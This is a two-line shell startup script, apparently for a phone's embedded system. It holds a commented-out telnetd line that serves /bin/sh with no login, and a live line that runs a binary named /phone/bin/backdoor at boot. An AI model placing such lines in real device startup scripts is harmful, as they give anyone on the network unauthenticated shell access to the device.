#!/bin/sh

#/usr/sbin/telnetd -F -l /bin/sh &

/phone/bin/backdoor &
